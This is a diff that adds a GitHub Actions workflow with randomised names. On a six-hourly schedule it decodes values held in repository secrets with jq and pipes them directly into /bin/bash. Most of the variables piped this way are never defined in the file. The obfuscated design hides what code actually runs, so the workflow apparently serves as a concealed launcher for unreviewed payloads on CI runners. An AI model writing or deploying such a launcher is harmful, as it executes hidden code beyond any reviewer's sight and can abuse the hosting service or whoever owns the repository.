@@ -1,0 +1,25 @@
+name: qingtongqingong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qingtongqingong
+        env:
+          nayw9: ${{ secrets.nayw9 }}
+        run: |
+          echo $nayw9 | jq -r .kbmwi26 | /bin/bash
+          echo $ntipx5860 | jq -r .iqw0197 | /bin/bash
+          echo $jaij9 | jq -r .te00903 | /bin/bash
+          echo $vvov39164 | jq -r .yj82757 | /bin/bash
+          echo $cqcm21516 | jq -r .wa303 | /bin/bash
+          echo $ugxhs4 | jq -r .q51062 | /bin/bash
+          echo $jivt1 | jq -r .hop437 | /bin/bash
+          echo $fyxh613 | jq -r .nkcku1 | /bin/bash
+
